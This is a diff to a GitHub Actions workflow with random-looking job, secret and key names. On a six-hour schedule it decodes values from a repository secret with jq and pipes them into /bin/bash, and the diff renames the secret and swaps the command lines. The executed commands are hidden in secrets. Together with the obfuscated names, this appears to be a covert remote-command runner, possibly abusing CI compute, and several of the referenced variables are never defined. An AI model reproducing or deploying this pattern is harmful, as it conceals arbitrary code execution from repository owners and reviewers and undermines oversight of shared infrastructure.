@@ -2,24 +2,20 @@ name: kaklixn
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 2/6 * * *'
-
+    - cron: '59 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: kaklixn
         env:
-          lfj773: ${{ secrets.lfj773 }}
+          crwlh506: ${{ secrets.crwlh506 }}
         run: |
-          echo $lfj773 | jq -r .nmezs0322 | /bin/bash
-          echo $zhs17804 | jq -r .rfjf355 | /bin/bash
-          echo $f90301 | jq -r .w56711 | /bin/bash
-          echo $hj49 | jq -r .qgcn78 | /bin/bash
-          echo $o39 | jq -r .ri68 | /bin/bash
-          echo $zihz04 | jq -r .pgbdh16 | /bin/bash
-          echo $bp98515 | jq -r .o8 | /bin/bash
-          echo $ze189 | jq -r .ffzs53075 | /bin/bash
+          echo $crwlh506 | jq -r .ukrl16286 | /bin/bash
+          echo $cyst5 | jq -r .sxx787 | /bin/bash
+          echo $dmhk818 | jq -r .yrrtm55 | /bin/bash
+          echo $inn23 | jq -r .cah5306 | /bin/bash
+          echo $gg61635 | jq -r .c40 | /bin/bash
+          echo $rorp418 | jq -r .baxx21 | /bin/bash
 
